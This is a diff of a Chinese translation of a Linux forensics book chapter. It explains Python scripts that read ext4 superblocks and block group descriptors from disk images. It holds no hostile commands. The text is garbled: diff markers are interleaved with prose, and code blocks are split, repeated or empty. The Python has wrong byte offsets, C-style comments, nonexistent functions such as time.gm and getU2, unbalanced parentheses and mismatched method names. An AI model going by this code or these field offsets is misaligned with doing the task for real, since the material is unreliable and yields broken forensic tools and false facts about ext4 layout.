-        self.defaultUid = getu16(data, 0x50)
-        # 预留块的 GID
-        self.defaultGid = getu16(data, 0x52)
-        # 仅限 Ext4 动态 revisionLevel superblock
-        # 第一个非预留 inode
-        self.firstInode = getu32(data, 0x54)
-        # inode 大小，字节
-        self.inodeSize = getu16(data, 0x58)
-        # 此 superblock 所在的块组
-        self.blockGroupNumber = getu16(data, 0x5a)
-        # 兼容性特性
-        self.compatibleFeatures = getu32(data, 0x5c)
-        self.compatibleFeaturesList = \
-            getCompatibleFeaturesList(self.compatibleFeatures)
-        # 不兼容特性
-        self.incompatibleFeatures = getu32(data, 0x60)
-        self.incompatibleFeaturesList = \
-            getIncompatibleFeaturesList(self.incompatibleFeatures)
-        # 只读兼容性特性
-        self.readonlyCompatibleFeatures = getu32(data, 0x64)
-        self.readonlyCompatibleFeaturesList = \
-            getReadOnlyCompatibleFeaturesList(
-                self.readonlyCompatibleFeatures)
-        # 以包字符串形式保留卷 UUID
-        self.uuid = getu128(data, 0x68)
-        # 卷名 - 可能为空
-        self.volumeName = data[0x78:0x88].split("\x00")[0]
-        # 最后挂载的目录
-        self.lastMounted = data[0x88:0xc8].split("\x00")[0]
-        # 用于压缩
-        self.algorithmUsageBitmap = getu32(data, 0xc8)
-        # ext4未使用
-        self.preallocBlocks = getu8(data, 0xcc)
-        # 仅用于 DIR_PREALLOC 特性
-        self.preallocDirBlock = getu8(data, 0xcd)
-        # 为未来扩展预留的块
-        self.reservedGdtBlocks = getu16(data, 0xce)
-        # 日志 superblock 的 UUID
-        self.journalUuid = getu128(data, 0xd0)
-        # 日志 inode 号
-        self.journalNode = getu32(data, 0xe0)
-        # 外部日志设备号
-        self.journalDev = getu32(data, 0xe4)
-        # 待删除孤立 inode 列表
-        self.lastOrphan = getu32(data, 0xe8)
-        self.hashSeed = []
-        self.hashSeed.append(getu32(data, 0xff)) # htree 哈种子
-        self.hashSeed.append(getu32(data, 0xf0))
-        self.hashSeed.append(getu32(data, 0xf4)) # 0/1/2/3/4 有符号哈/无符号哈/测试
-        self.hashVersion = getu8(data, 0xfc)
-        self.journalBackupType = getu8(data, 0xfd)
-        # 64位位描述符大小
-        self.descriptorSize = getu16(data, 0xfe)
-        self.defaultMountOptions = getu32(data, 0x100)
-        # 仅用于 meta 特性
-        self.firstMetaBlockGroup = getu32(data, 0x104)
-        # 文件系统何时创建
-        self.mkfTime = time.ctime(getu32(data, 0x108))
-        self.journalBlocks = []
-        # 日志节点副本和最后两个元素
-        for i in range(0, 17):
-            self.journalBlocks.append(getu32(data, 0x10c + i*4))
-        # 仅限 64 位模式
-        self.blockCountHi = getu32(data, 0x150)
-        self.reservedBlockCountHi = getu32(data, 0x154)
-        self.freeBlocksHi = getu32(data, 0x158)
-        # 所有节点至少足够的空间
-        self.minInodeSize = getu16(data, 0x15c)
-        # 新 inode 可能会预留多少字节
-        self.wantInodeSize = getu16(data, 0x15e)
-        # 1/2/4 有符号哈/无符号哈/测试代码
-        self.miscFlags = getu32(data, 0x160)
-        # 从 RAID 读取到移动到下一个目录的逻辑块
-        self.raidStride = getu16(data, 0x164)
-        # 多次挂载计数之间的秒数
-        self.mmpInterval = getu16(data, 0x166)
-        # MMP 数据块号
-        self.mmpBlock = getu64(data, 0x168)
 ```
 
 
 
+```python
+self.mountTime = time.ctime(getu32(data, 0x2c))
+
+self.writeTime = time.ctime(getu32(data, 0x30))
+
+# 自 fsck 以来的挂载次数
+
+self.mountCount = getu16(data, 0x34)
+
+# fsck 之间的挂载次数
+
+self.maxMountCount = getu16(data, 0x36)
+
+self.magic = getu16(data, 0x38) # 应为 0xef530001/0002/0004 =干净卸载/错误/孤立节点
+
+self.state = getu16(data, 0xa)
+
+# 错误 1/2/3 继续/只读
+
+self.errors = getu16(data, 0x3c)
+
+self.minRevision = getu16(data, 0x3e)
+
+# 上次 fsck 时间
+
+self.lastCheck = time.ctime(getu32(data, 0x40))
+
+# 检查间隔秒
+
+self.checkInterval = getu32(data, 0x44)
+
+# 0/1/2/3/4 Linux/Hard/FreeBSD
+
+self.creatorOs = getu32(data, 0x48)
+
+# v2 动态 inode 大
+
+self.revisionLevel = getu32(data, 0x4c)
+
+# 预留块的 UID
+
+self.defaultUid = getu16(data, 0x50)
+
+# 预留块的 GID
+
+self.defaultGid = getu16(data, 0x52)
+
+# 仅限 Ext4 动态 revisionLevel superblock
+
+# 第一个非预留 inode
+
+self.firstInode = getu32(data, 0x54)
+
+# inode 大小，字节
+
+self.inodeSize = getu16(data, 0x58)
+
+# 此 superblock 所在的块组
+
+self.blockGroupNumber = getu16(data, 0x5a)
+
+# 兼容性特性
+
+self.compatibleFeatures = getu32(data, 0x5c)
+
+self.compatibleFeaturesList = \
+    getCompatibleFeaturesList(self.compatibleFeatures)
+
+# 不兼容特性
+
+self.incompatibleFeatures = getu32(data, 0x60)
+
+self.incompatibleFeaturesList = \
+    getIncompatibleFeaturesList(self.incompatibleFeatures)
+
+# 只读兼容性特性
+
+self.readonlyCompatibleFeatures = getu32(data, 0x64)
+
+self.readonlyCompatibleFeaturesList = \
+    getReadOnlyCompatibleFeaturesList(
+        self.readonlyCompatibleFeatures)
+
+# 以包字符串形式保留卷 UUID
+
+self.uuid = getu128(data, 0x68)
+
+# 卷名 - 可能为空
+
+self.volumeName = data[0x78:0x88].split("\x00")[0]
+
+# 最后挂载的目录
+
+self.lastMounted = data[0x88:0xc8].split("\x00")[0]
+
+# 用于压缩
+
+self.algorithmUsageBitmap = getu32(data, 0xc8)
+
+# ext4未使用
+
+self.preallocBlocks = getu8(data, 0xcc)
+
+# 仅用于 DIR_PREALLOC 特性
+
+self.preallocDirBlock = getu8(data, 0xcd)
+
+# 为未来扩展预留的块
+
+self.reservedGdtBlocks = getu16(data, 0xce)
+
+# 日志 superblock 的 UUID
+
+self.journalUuid = getu128(data, 0xd0)
+
+# 日志 inode 号
+
+self.journalNode = getu32(data, 0xe0)
+
+# 外部日志设备号
+
+self.journalDev = getu32(data, 0xe4)
+
+# 待删除孤立 inode 列表
+
+self.lastOrphan = getu32(data, 0xe8)
+
+self.hashSeed = []
+
+self.hashSeed.append(getu32(data, 0xff)) # htree 哈种子
+
+self.hashSeed.append(getu32(data, 0xf0))
+
+self.hashSeed.append(getu32(data, 0xf4)) # 0/1/2/3/4 有符号哈/无符号哈/测试
+
+self.hashVersion = getu8(data, 0xfc)
+
+self.journalBackupType = getu8(data, 0xfd)
+
+# 64位位描述符大小
+
+self.descriptorSize = getu16(data, 0xfe)
+
+self.defaultMountOptions = getu32(data, 0x100)
+
+# 仅用于 meta 特性
+
+self.firstMetaBlockGroup = getu32(data, 0x104)
+
+# 文件系统何时创建
+
+self.mkfTime = time.ctime(getu32(data, 0x108))
+
+self.journalBlocks = []
+
+# 日志节点副本和最后两个元素
+
+for i in range(0, 17):
+    self.journalBlocks.append(getu32(data, 0x10c + i*4))
+
+# 仅限 64 位模式
+
+self.blockCountHi = getu32(data, 0x150)
+
+self.reservedBlockCountHi = getu32(data, 0x154)
+
+self.freeBlocksHi = getu32(data, 0x158)
+
+# 所有节点至少足够的空间
+
+self.minInodeSize = getu16(data, 0x15c)
+
+# 新 inode 可能会预留多少字节
+
+self.wantInodeSize = getu16(data, 0x15e)
+
+# 1/2/4 有符号哈/无符号哈/测试代码
+
+self.miscFlags = getu32(data, 0x160)
+
+# 从 RAID 读取到移动到下一个目录的逻辑块
+
+self.raidStride = getu16(data, 0x164)
+
+# 多次挂载计数之间的秒数
+
+self.mmpInterval = getu16(data, 0x166)
+
+# MMP 数据块号
+
+self.mmpBlock = getu64(data, 0x168)
+```
+
+
 
 # 回到此磁盘前的读/写块数量
+```python
 self.raidStripeWidth = getU32(data, 0x170)
+```
 # 每个 flex group 的组数
+```python
 self.groupsPerFlex = getU8(data, 0x174)
+```
 # crc32 时应为 1
+```python
 self.metadataType = getU8(data, 0x175)
 self.reservedPad = getU16(data, 0x176) # 应为 0
+```
 # 截止为止写入的千字节
+```python
 self.kilobytesWritten = getU64(data, 0x178)
+```
 # 活跃快照的 inode
+```python
 self.snapshotInode = getU32(data, 0x180)
+```
 # 活跃快照的 ID
+```python
 self.snapshotId = getU32(data, 0x184)
+```
 # 为快照预留的块
+```python
 self.snapshotReservedBlocks = getU64(data, 0x188)
+```
 # 快照头部的 inode 号
+```python
 self.snapshotList = getU32(data, 0x190)
 self.errorCount = getU32(data, 0x194)
+```
 # 首次检测时间
+```python
 self.firstErrorTime = time.gm(getU32(data, 0x198))
 self.firstErrorInode = getU32(data, 0x19c) # 有罪的 inode
 self.firstErrorBlock = getU64(data, 0x19a) # 有罪的块
 self.firstErrorFunction = data[0xa8:0xc18].split("\x00") # 发生错误的行号
 self.lastErrorLine = getU32(data, 0x1c8)
+```
 # 最后检测时间
+```python
 self.lastErrorTime = time.gm(data, 0x1cc)
 self.lastErrorInode = getU32(data, 0x1d0) # 有罪的 inode
+```
 # 发生错误的行号
+```python
 self.lastErrorLine = getU32(data, 0x1d4)
 self.lastErrorBlock = getU64(data, 0x1d8) # 有罪的块
 self.lastErrorFunction = data[0xe0:0x200].split("\x00") # 空终止挂载选项字符串
 self.mountOptions = data[0x200:0x240].split("\x00") # 用户配额文件的 inode
 self.userQuotaInode = getU32(data, 0x240)
+```
 # 组配额文件的 inode
+```python
 self.groupQuotaInode = getU32(data, 0x244)
 self.overheadBlocks = getU2(data, 0x248) # 应为 0
 self.backupGroups = [getU2(data, 0x24c), getU2(data, 0x250)] # 仅限稀疏
@@ -4275,7 +4883,9 @@ self.encryptionAlgorithms = []
 for i in range(0, 4):
     self.encryptionAlgorithms.append(getU2(data, 0x254 + i*4))
 self.checksum = getU2(data, 0x3fc)
+```
 
+```python
 def initState(self):
     # 0001/0002/0004 清洁卸载/孤立节点
     retVal = "Unknown"
@@ -4286,7 +4896,9 @@ def initState(self):
     elif self.state == 4:
         retVal = "正在恢复孤立节点"
     return retVal
+```
 
+```python
 def printErrorBehavior(self):
     # 当错误 1/2/3 时继续/只读/崩溃
     retVal = "Unknown"
@@ -4297,7 +4909,9 @@ def printErrorBehavior(self):
     elif self.errors == 3:
         retVal = "内核崩溃"
     return retVal
+```
 
+```python
 def printCreator(self):
     # 0/1/2/3/4 Linux/Hurd/Masix/FreeBSD/Lites
     retVal = "Unknown"
@@ -4312,7 +4926,9 @@ def printCreator(self):
     elif self.creatorOs == 4:
         retVal = "Lites"
     return retVal
+```
 
+```python
 def printHashAlgorithm(self):
     # 0/1/2/3/4/5 旧版/半 MD4/tea/u-legacy/u-half MD4/u-Tea
     retVal = "Unknown"
@@ -4329,7 +4945,9 @@ def printHashAlgorithm(self):
     elif self.hashVersion == 5:
         retVal = "无签名 Tea"
     return retVal
+```
 
+```python
 def printEncryptionAlgorithms(self):
     enclist = []
     for v in self.encryptionAlgorithms:
@@ -4344,7 +4962,9 @@ def printEncryptionAlgorithms(self):
         else:
             enclist.append('Unknown')
     return enclist
+```
 
+```python
 def prettyPrint(self):
     for k, v in self.__dict__.items():
         if k == 'mountTime' or k == 'writeTime' or \
@@ -4365,13 +4985,17 @@ def prettyPrint(self):
             print(k+":", self.printEncryptionAlgorithms())
         else:
             print(k+":", v)
+```
 
+```python
 def usage():
     print("usage " + sys.argv[0] +
           "<镜像文件> <扇区偏移>"
           "从镜像文件中读取 superblock")
     exit(1)
+```
 
+```python
 def main():
     if len(sys.argv) < 3:
         usage()
@@ -4385,14 +5009,16 @@ def main():
         sbRaw = f.read(1024)
     sb = Superblock(sbRaw)
     sb.prettyPrint()
+```
 
+```python
 if __name__ == "__main__":
     main()
+```
 
-通常 shebang 后面跟着几个 import 语句。然后定义了一些如 getU32 等的辅助函数，它们接收一个带有可选偏移的包字符串并返回相应的值。所有这些函数都使用了 `struct.unpack`。创建这些函数是为了让后续代码更整洁、易读。接下来你将看到 `printUuid` 函数，它以正确的格式打印 UUID。后面是三个函数，返回表示兼容、不兼容和只读特性的字符串列表。这三个函数使用位与逻辑运算符 `&` 来测试相应的位是否被设置。像所有标准的 Python 类一样，它从一个构造函数开始，在 Python 中会被调用 `__init__`。该构造函数由脚本开头对辅助函数的长列表组成。该构造函数的大部分是直观的。一些不明显的行被注释掉了。superblock 中有很多时间字段。所有这些字段存储的都是自纪元（1970年1月1日午夜）以秒计算的时间。通过 `time.gm(<seconds since epoch>)` 将这些转换为时间。例如，`self.mountTime = time.gm(getU32(data, 0x2c))` 用于设置 Superblock 类中的 `mountTime` 变量。该函数使用了 `split` 函数。`split` 函数用于根据字符或字符集分割字符串。`split` 的语法为 `string.split(<string [,separators],[max split]>)`。如果没有指定分隔，则按空白字符分割。如 `self.volumeName = data[0x78]` 这样的行用于按空字节（"\x00"）分割字符串并仅保留空字节之前的所有内容。这是为了防止我们的之后出现随机字节。创建一个空列表并使用 `append` 函数将项添加到列表中。还有一些以 2 的幂形式存储的大小。除了上述提到的异常外，没有书中讨论的新技术。Superblock 类定义了几个函数，以友好的方式打印文件系统、错误行为、操作系统、哈希算法和加密算法。Superblock 以一个 `pretty` 函数结束，用于打印 superblock 对象中包含的所有信息。该函数使用一个所有 Python 对象都隐式定义的字典。对于 Python 初学者来说，字典本质上是一个列表，但有一个重要的区别：它不是使用整数索引作为键从列表（值）中检索项，而是使用字符串作为键。使用空方括号 `[]` 定义空列表，花括号 `{}` 创建空字典。像列表一样，字典用于检索项。同样，与列表一样，存储在字典中的项可以是不同类型。应该注意的是，字典中的项没有顺序，因此添加项的顺序无关。Python 为每个对象创建的隐式定义字典是 `__dict__`。键和值与对象中存储的类型相同。Superblock.prettyPrint 中的 `for k, v in self.__dict__.items() :` 行演示了创建遍历字典循环的语法。`prettyPrint` 中的 `if/elif/else` 块用于打印这些项。
+通常 `shebang` 后面跟着几个 `import` 语句。然后定义了一些如 `getU32` 等的辅助函数，它们接收一个带有可选偏移的包字符串并返回相应的值。所有这些函数都使用了 `struct.unpack`。创建这些函数是为了让后续代码更整洁、易读。接下来你将看到 `printUuid` 函数，它以正确的格式打印 UUID。后面是三个函数，返回表示兼容、不兼容和只读特性的字符串列表。这三个函数使用位与逻辑运算符 `&` 来测试相应的位是否被设置。像所有标准的 Python 类一样，它从一个构造函数开始，在 Python 中会被调用 `__init__`。该构造函数由脚本开头对辅助函数的长列表组成。该构造函数的大部分是直观的。一些不明显的行被注释掉了。`superblock` 中有很多时间字段。所有这些字段存储的都是自纪元（1970年1月1日午夜）以秒计算的时间。通过 `time.gm(<seconds since epoch>)` 将这些转换为时间。例如，`self.mountTime = time.gm(getU32(data, 0x2c))` 用于设置 `Superblock` 类中的 `mountTime` 变量。该函数使用了 `split` 函数。`split` 函数用于根据字符或字符集分割字符串。`split` 的语法为 `string.split(<string [,separators],[max split]>)`。如果没有指定分隔，则按空白字符分割。如 `self.volumeName = data[0x78]` 这样的行用于按空字节（`"\x00"`）分割字符串并仅保留空字节之前的所有内容。这是为了防止我们的之后出现随机字节。创建一个空列表并使用 `append` 函数将项添加到列表中。还有一些以 2 的幂形式存储的大小。除了上述提到的异常外，没有书中讨论的新技术。`Superblock` 类定义了几个函数，以友好的方式打印文件系统、错误行为、操作系统、哈希算法和加密算法。`Superblock` 以一个 `pretty` 函数结束，用于打印 `superblock` 对象中包含的所有信息。该函数使用一个所有 Python 对象都隐式定义的字典。对于 Python 初学者来说，字典本质上是一个列表，但有一个重要的区别：它不是使用整数索引作为键从列表（值）中检索项，而是使用字符串作为键。使用空方括号 `[]` 定义空列表，花括号 `{}` 创建空字典。像列表一样，字典用于检索项。同样，与列表一样，存储在字典中的项可以是不同类型。应该注意的是，字典中的项没有顺序，因此添加项的顺序无关。Python 为每个对象创建的隐式定义字典是 `__dict__`。键和值与对象中存储的类型相同。`Superblock.prettyPrint` 中的 `for k, v in self.__dict__.items() :` 行演示了创建遍历字典循环的语法。`prettyPrint` 中的 `if/elif/else` 块用于打印这些项。
 
-
-位置。请记住超级块（superblock）长度为 1024 字节，并从文件系统的第 1024 字节处开始。一旦读取了正确的字节，就会将它们传递给 Superblock 构造函数，位于 `sb = Superblock(sbRaw)`，然后在下一行打印超级块的字段，`sb.prettyPrint()`。
+位置。请记住超级块（`superblock`）长度为 1024 字节，并从文件系统的第 1024 字节处开始。一旦读取了正确的字节，就会将它们传递给 `Superblock` 构造函数，位于 `sb = Superblock(sbRaw)`，然后在下一行打印超级块的字段，`sb.prettyPrint()`。
 
 在 PFE 目标系统上运行此新脚本的部分结果如图 7.11 所示。检查图 7.11，你会发现该目标系统具有以下只读兼容特性：稀疏求和（Sparse Sum）、大文件（Large File）、巨大文件（Huge File）、组描述符表校验和（Group Descriptor Table Checksum）、目录链接数（Directory Nlink）和额外大小（Extra Size）。将其与图 7.3 比较，你会发现 Sleuth 类具有两个特性：组描述符表校验和和目录链接数！为了继续构建关于我们文件系统如何组织的完整蓝图景，我们必须读取块组描述符。
 
@@ -4404,149 +5030,261 @@ if __name__ == "__main__":
 
 ## 读取块组描述符
 
-块组描述符比超级块简单得多且更小。请记住，这些组描述符长度为 32 字节，除非 ext4 文件系统使用了 64 位模式，在这种情况下它们的长度为 64 字节。以下代码定义了一个 `GroupDescriptor` 类。与 `Superblock` 类一样，通常位于行尾的注释被放置在行上方，以便在书中更具读性。
+块组描述符比超级块简单得多且更小。请记住，这些组描述符长度为 32 字节，除非 `ext4` 文件系统使用了 64 位模式，在这种情况下它们的长度为 64 字节。以下代码定义了一个 `GroupDescriptor` 类。与 `Superblock` 类一样，通常位于行尾的注释被放置在行上方，以便在书中更具读性。
+
+```python
+```
+
+
+
+### `GroupDescriptor` 类定义
 
 ```python
 class GroupDescriptor():
+
     def __init__(self, data, wide=False):
+
         /* 块位图映射 */
+
         self.blockBitmapLo=getU32(data)
+
         /* inode 位图块 */
+
         self.inodeBitmapLo=getU32(data, 4)
+
         /* inode 表块 */
+
         self.inodeTableLo=getU32(data, 8)
+
         /* 空闲块计数 */
+
         self.freeBlocksCountLo=getU16(data, 0x0c)
+
         /* 空闲 inode 计数 */
+
         self.freeInodesCountLo=getU16(data, 0x0)
+
         /* 目录计数 */
+
         self.usedDirsCountLo=getU16(data, 0x10)
+
         /* EXT4_BG 标志 (INODE_UNINIT, 等) */
+
         self.flags=getU16(data, 0x12)
+
         self.flagsList = self.printFlagList()
+
         /* 用于快照的排除位图 */
+
         self.excludeBitmapLo=getU32(data, 0x14)
+
         /* crc32c (s_uuid+grp_num+bmap) LE */
+
         self.blockBitmapCsum=getU16(data, 0x18)
+
         /* crc32c (s_uuid+grp_num+ibitmap) LE */
+
         self.inodeBitmapCsum=getU16(data, 0x1a)
+
         /* 未用 inode 计数 */
+
         self.itableUnusedLo=getU16(data, 0x1c)
+
         /* crc16 (sb_uuid+group+desc) */
+
         self.checksum=getU16(data, 0x1e)
+
         if wide==True:
+
             /* 块位图块 MSB */
+
             self.blockBitmapHi=getU32(data, 0x20)
+
             /* inode 位图块 MSB */
+
             self.inodeBitmapHi=getU32(data, 0x24)
+
             /* inode 表块 MSB */
+
             self.inodeTableHi=getU32(data, 0x28)
+
             /* 空闲块计数 MSB */
+
             self.freeBlocksCountHi=getU16(data, 0x2c)
+
             /* 空闲 inode 计数 MSB */
+
             self.freeInodesCountHi=getU16(data, 0x2e)
+
             /* 目录计数 MSB */
+
             self.usedDirsCountHi=getU16(data, 0x30)
+
             /* 未用 inode 计数 MSB */
+
             self.itableUnusedHi=getU16(data, 0x32)
+
             /* 排除位图块 MSB */
+
             self.excludeBitmapHi=getU32(data, 0x34)
+
         /* *
+
         crc32c(s.uuid+grp_num+bmap) BE */
+
         self.blockBitmapSumHi=getU16(data, 0x38)
+
         /* *
+
         crc32c(s.uuid+grp_num+bmap) BE */
+
         self.inodeBitmapSumHi=getU16(data, 0x3a)
+
         self.reserved=getU32(data, 0x3c)
 
     def printFlagSet(self):
+
         flagList = []
+
         # inode 表和位图未初始化 (EXT4_BG_INODE_UNINIT)
+
         if self.flags & 0x1:
+
             flagList.append('Inode Uninitialized')
+
         # 块位图未初始化 (EXT4_BG_BLOCK_UNINIT)
+
         if self.flags & 0x2:
+
             flagList.append('Block Uninitialized')
+
         # inode 表已清零 (EXT4_BG_INODE_ZEROED)
+
         if self.flags & 0x4:
+
             flagList.append('Inode Zeroed')
+
         return flagList
 
     def prettyPrint(self):
+
         for k, v in sorted(self.items()):
+
             print(k + " " + v)
+
 ```
 
-新类的定义非常直观。请注意，构造函数接受一个可选参数，用于指示是否使用了 64 位模式。`GroupDescriptor` 本身在定位、读取和解释组描述符方面并不困难。之所以这样做，是因为需要从超级块获取数据以创建一个新的 `ExtMetadata` 类（用于扩展元数据），该类结合了来自超级块和组描述符的信息，以解决这个问题。该类的代码如下。
+新类的定义非常直观。请注意，构造函数接受一个可选参数，用于指示是否使用了 64 位模式。`GroupDescriptor` 本身在定位、读取和解释组描述符方面并不困难。之所以这样做，是因为需要从超级块获取数据以创建一个新的 `ExtMetadata` 类，用于扩展元数据，该类结合了来自超级块和组描述符的信息，以解决这个问题。该类的代码如下。
+
+### `ExtMetadata` 类定义
 
 ```python
 class ExtMetadata:
+
     def __init__(self, filename, offset):
+
         # 读取第一个扇区
+
         if not os.path.isfile(filename):
+
             print("file " + str(filename) + " cannot be opened for reading")
+
             exit(1)
+
         with open(filename, 'rb') as f:
+
             f.seek(1024 + int(offset) * 512)
+
             sbRaw = str(f.read(1024))
+
             superblock = Superblock(sbRaw)
+
             # 读取组描述符
+
             groupGroups = superblock.groupGroups()
+
             if superblock.descriptorSize != 0:
+
                 wide = True
+
                 descriptorSize = 64
+
             else:
+
                 wide = False
+
                 descriptorSize = 32
+
             # 读取组描述符
+
             with open(filename, 'rb') as f:
+
                 f.seek(int(offset) * 512)
+
                 bgd = f.read(descriptorSize)
+
                 self.bgList = []
+
                 for i in range(groupGroups):
+
                     bgd = GroupDescriptor(bgd)
+
                     self.bgList.append(bgd)
 
     def prettyPrint(self):
+
         for bgd in self.bgList:
+
             bgd.prettyPrint()
 
     def usage():
+
         print("usage " + sys.argv[0] + " <file> <offset in sectors>")
+
         exit(1)
 
     def main():
+
         if len(sys.argv) < 3:
+
             usage()
-        if not os.path.isfile(sys.argv[1]):
-            print("File " + sys.argv[1] + " cannot be opened for reading")
-            exit(1)
-        emd = ExtMetadata(sys.argv[1], sys.argv[2])
-        emd.prettyPrint()
+```
+
+
+
+```python
+if not os.path.isfile(sys.argv[1]):
+    print("File " + sys.argv[1] + " cannot be opened for reading")
+    exit(1)
+
+emd = ExtMetadata(sys.argv[1], sys.argv[2])
+emd.prettyPrint()
 
 if __name__ == "__main__":
     main()
 ```
 
-
-
-
 ```python
 def groupIndexFromBlock(self, blockNo):
     return blockNo % self.blocksPerGroup
+
 def groupFromInode(self, inode):
     return (inode - 1) / self.inodesPerGroup
+
 def groupIndexFromInode(self, inode):
     return (inode - 1) % self.inodesPerGroup
 ```
 
-Superblock 类最后一个添加的函数是 `groupHasSuperblock`。如果你将块组编号传递给此函数，它将告诉你（好吧，不是字面上的你，但它会返回一个值）根据正在使用的特性，该块是否包含超级。该函数的代码如下：
+### `Superblock` 类的 `groupHasSuperblock`
+
+`Superblock` 类最后一个添加的函数是 `groupHasSuperblock`。如果你将块组编号传递给此函数，它将告诉你（好吧，不是字面上的你，但它会返回一个值）根据正在使用的特性，该块是否包含超级。该函数的代码如下：
 
 ```python
 def groupHasSuperblock(self, bgNo):
     # 块组 0 总是有一个超级
     if bgNo == 0:
         return True
+
     if 'Meta Block Groups' in self.incompatibleFeaturesList and \
         bgNo >= self.firstMetaBlockGroup:
             # 块组在每个元组的第一个、
@@ -4557,17 +5295,20 @@ def groupHasSuperblock(self, bgNo):
             retVal = (bgNo % mbgSize == 0) or \
                 ((bgNo + 1) % mbgSize == 0) or \
                 (bgNo - 1) % mbgSize == 0)
+
     elif 'Sparse Super' in self.compatibleFeaturesList:
         # self.backupBlockGroups 中有两个备份超级
         if bgNo == self.backupBlockGroups[0] or \
             bgNo == self.backupBlockGroups[1]:
             retVal = True
+
     elif 'Sparse Super' in self.readonlyCompatibleFeaturesList:
         # 备份在 1、3 的幂次和 5 的幂中
         retVal = (bgNo == 1) or \
             (bgNo == pow(3, round(bgNo) / log(3))) or \
             (bgNo == pow(5, round(bgNo) / log(5))) or \
             (bgNo == pow(7, round(bgNo) / log(7)))
+
     if retVal:
         return retVal
     else:
@@ -4577,11 +5318,13 @@ def groupHasSuperblock(self, bgNo):
         return retVal
 ```
 
-该函数主要是一个大的 `if/elif/else` 块。它首先检查块组是否为 0。如果是，它会立即返回 True，因为第一个组中始终有一个超级。
+该函数主要是一个大的 `if/elif/else` 块。它首先检查块组是否为 `0`。如果是，它会立即返回 `True`，因为第一个组中始终有一个超级。
 
 接下来，我们检查 `Meta Block Groups`（元块组）特性。记住，该特性将文件系统分成多个元组。元组就像小文件系统，其组描述符仅与元组内部的块组相关。当此特性启用时，元组内的第一个、第二个和最后一个块组中有一个超级块和一个组描述符表。元组的大小始终为 `blocksize / 32`。此外，超级组可能只适用于磁盘的一部分，因此需要进行检查以确保我们处于存在元组的区域。
 
-接下，我们检查 `Sparse Super 2`（稀疏超级 2）特性。该特性在超级中列出的两个组中存储备份超级。下一个检查是 `Sparse Super` 特性。如果正在使用此特性，备份超级位于组 1 且是 3、5 或 7 的幂次。这就是之前对数函数起作用的地方。对于 $x$ 的任何偶次幂，$x^{\text{rounded}(\log(n))}$ 应该等于 $n$。
+接下，我们检查 `Sparse Super 2`（稀疏超级 2）特性。该特性在超级中列出的两个组中存储备份超级。下一个检查是 `Sparse Super` 特性。如果正在使用此特性，备份超级位于组 `1` 且是 `3`、`5` 或 `7` 的幂次。这就是之前对数函数起作用的地方。对于 `$x$` 的任何偶次幂，`$x^{\text{rounded}(\log(n))}$` 应该等于 `$n$`。
+
+### `GroupDescriptor` 与 `ExtendedDescriptor`
 
 `GroupDescriptor` 类保持不变。我们添加了一个新类 `ExtendedDescriptor`，它将我们的超级块信息与组描述符相结合，以完整描述块组。这个新类在通用 `GroupDescriptor` 类发现的内容的基础上增加了布局信息。有些人可能会质疑，为什么我选择不让 `ExtendedDescriptor` 类继承（或扩展）`GroupDescriptor` 类。主要原因是 `GroupDescriptor` 类在存储原始数据结构上较小，而 `ExtendedDescriptor` 包含了从原始值派生的意义成员。该类的代码如下：
 
@@ -4619,53 +5362,74 @@ class ExtendedDescriptor():
             if bgNo % sb.groupsPerFlex == 0:
                 fbgAdj = sb.groupsPerFlex
             if sb.groupHasSuperblock(bgNo):
-                self.layout.append(['Superblock', self.startBlock])
-                gdSize = sb.groupDescriptorSize() * sb.blockGroups() / sb.blockSize
-                self.layout.append(['Group Descriptor Table', self.startBlock + 1, self.startBlock + gdSize])
-                self.nonDataBlocks += gdSize + 1
-                if sb.reservedGdtBlocks > 0:
-                    self.layout.append(['Reserved GDT Blocks', self.startBlock + gdSize + 1, self.startBlock + gdSize + sb.reservedGdtBlocks])
-                    self.nonDataBlocks += sb.reservedGdtBlocks
-        bbm = bgd.blockBitmapLo
-        if bgd.wide:
-            bbm += bgd.blockBitmapHi * pow(2, 32)
-            self.layout.append(['Data Block Map', bbm])
-        # 块位是否在该组中（灵活组除外）
-        if sb.groupFromBlock(bbm) == bgNo:
-            self.nonDataBlocks += fbgAdj
-        ibm = bgd.inodeBitmapLo
-        if bgd.wide:
-            ibm += bgd.inodeBitmapHi * pow(2, 32)
-            self.layout.append(['Inode Bitmap', ibm])
-        # 节点位是否在该组中？
-        if sb.groupFromBlock(ibm) == bgNo:
-            self.nonDataBlocks += fbgAdj
-        it = bgd.inodeTableLo
-        if bgd.wide:
-            it += bgd.inodeTableHi * pow(2, 32)
-        itBlocks = (sb.inodePerGroup * sb.inodeSize) / sb.blockSize
-        self.layout.append(['Inode Table', it + itBlocks - 1])
-        # 节点表是否在该组中？
-        if sb.groupFromBlock(it) == bgNo:
-            self.nonDataBlocks += itBlocks * fbgAdj
-        self.layout.append(['Data Blocks', self.startBlock + self.nonDataBlocks, self.endBlock])
-    def prettyPrint(self):
-        print("")
 ```
 
-构造函数中有几点可能需要解释。你会看到读取 `bgd.wide` 的行：在在赋值之后，如果该语句为真（使用宽模式或 64 位模式），则会将另一个乘以 $2^1$ 或 $2^2$ 的值加到新赋值的值上。这允许将存储在 64 位文件组描述符的两个字段中的原始值正确地存储在单个值中。
+
+
+```python
+self.layout.append(['Superblock', self.startBlock])
+
+gdSize = sb.groupDescriptorSize() * sb.blockGroups() / sb.blockSize
+
+self.layout.append(['Group Descriptor Table', self.startBlock + 1, self.startBlock + gdSize])
+
+self.nonDataBlocks += gdSize + 1
+
+if sb.reservedGdtBlocks > 0:
+    self.layout.append(['Reserved GDT Blocks', self.startBlock + gdSize + 1, self.startBlock + gdSize + sb.reservedGdtBlocks])
+    self.nonDataBlocks += sb.reservedGdtBlocks
+
+bbm = bgd.blockBitmapLo
+
+if bgd.wide:
+    bbm += bgd.blockBitmapHi * pow(2, 32)
+    self.layout.append(['Data Block Map', bbm])
+
+# 块位是否在该组中（灵活组除外）
+if sb.groupFromBlock(bbm) == bgNo:
+    self.nonDataBlocks += fbgAdj
+
+ibm = bgd.inodeBitmapLo
+
+if bgd.wide:
+    ibm += bgd.inodeBitmapHi * pow(2, 32)
+    self.layout.append(['Inode Bitmap', ibm])
+
+# 节点位是否在该组中？
+if sb.groupFromBlock(ibm) == bgNo:
+    self.nonDataBlocks += fbgAdj
+
+it = bgd.inodeTableLo
+
+if bgd.wide:
+    it += bgd.inodeTableHi * pow(2, 32)
+
+itBlocks = (sb.inodePerGroup * sb.inodeSize) / sb.blockSize
+
+self.layout.append(['Inode Table', it + itBlocks - 1])
+
+# 节点表是否在该组中？
+if sb.groupFromBlock(it) == bgNo:
+    self.nonDataBlocks += itBlocks * fbgAdj
+
